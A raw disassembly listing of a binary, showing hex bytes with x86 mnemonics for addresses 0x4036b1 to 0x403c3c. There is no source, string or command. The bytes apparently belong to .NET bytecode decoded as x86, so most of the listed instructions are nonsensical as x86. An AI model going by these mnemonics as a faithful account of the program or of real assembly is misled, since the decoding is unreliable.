  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 38             	es jb  0x40370a
  4036d2:	25 00 70 0a dd       	and    $0xdd0a7000,%eax
  4036d7:	00 00                	add    %al,(%eax)
  4036d9:	00 00                	add    %al,(%eax)
  4036db:	06                   	push   %es
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	4a                   	dec    %edx
  40372d:	25 00 70 28 91       	and    $0x91287000,%eax
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 b4 22 00       	and    $0x22b472,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 50                	jb     0x4037ca
  40377a:	25 00 70 6f 8c       	and    $0x8c6f7000,%eax
  40377f:	00 00                	add    %al,(%eax)
  403781:	06                   	push   %es
  403782:	25 72 66 25 00       	and    $0x256672,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 70 25 00       	and    $0x257072,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 7a 25 00       	and    $0x257a72,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 80                	jb     0x40374d
  4037cd:	25 00 70 14 6f       	and    $0x6f147000,%eax
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 94             	or     -0x6c(%edx),%dh
  4037d8:	25 00 70 28 96       	and    $0x96287000,%eax
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	98                   	cwtl
  4037ea:	25 00 70 72 a2       	and    $0xa2727000,%eax
  4037ef:	25 00 70 6f 95       	and    $0x956f7000,%eax
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 ae             	or     -0x52(%edx),%dh
  4037f9:	25 00 70 72 ba       	and    $0xba727000,%eax
  4037fe:	25 00 70 6f 95       	and    $0x956f7000,%eax
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 c6 25 00       	and    $0x25c672,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 d0 25 00       	and    $0x25d072,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 e0 25 00       	and    $0x25e072,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 ec             	or     -0x14(%edx),%dh
  403859:	25 00 70 72 e0       	and    $0xe0727000,%eax
  40385e:	25 00 70 6f 95       	and    $0x956f7000,%eax
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 f6             	or     -0xa(%edx),%dh
  403868:	25 00 70 72 70       	and    $0x70727000,%eax
  40386d:	25 00 70 6f 95       	and    $0x956f7000,%eax
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 02 26 00       	and    $0x260272,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 1a 26 00       	and    $0x261a72,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 2c 26 00       	and    $0x262c72,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 40 26 00       	and    $0x264072,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 54 26 00       	and    $0x265472,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 ae                	jb     0x4038a3
  4038f5:	22 00                	and    (%eax),%al
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 5e 26 00       	and    $0x265e72,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 6a             	adc    %esi,0x6a(%edx)
  40399e:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  4039a2:	8a 00                	mov    (%eax),%al
  4039a4:	00 0a                	add    %cl,(%edx)
  4039a6:	72 70                	jb     0x403a18
  4039a8:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  4039ac:	68 00 00 0a 72       	push   $0x720a0000
  4039b1:	9c                   	pushf
  4039b2:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4039b6:	a1 00 00 0a 0a       	mov    0xa0a0000,%eax
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 da    	or     0xda720907,%cl
  4039dd:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4039e1:	83 00 00             	addl   $0x0,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 f2                	jb     0x403a08
  403a16:	26 00 70 13          	add    %dh,%es:0x13(%eax)
  403a1a:	04 dd                	add    $0xdd,%al
  403a1c:	31 00                	xor    %eax,(%eax)
  403a1e:	00 00                	add    %al,(%eax)
  403a20:	72 fa                	jb     0x403a1c
  403a22:	26 00 70 07          	add    %dh,%es:0x7(%eax)
  403a26:	6f                   	outsl  %ds:(%esi),(%dx)
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 f2                	jb     0x403a39
  403a47:	26 00 70 13          	add    %dh,%es:0x13(%eax)
  403a4b:	04 dd                	add    $0xdd,%al
  403a4d:	00 00                	add    %al,(%eax)
  403a4f:	00 00                	add    %al,(%eax)
  403a51:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 ae             	add    %dh,-0x52(%edx)
  403b3e:	22 00                	and    (%eax),%al
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
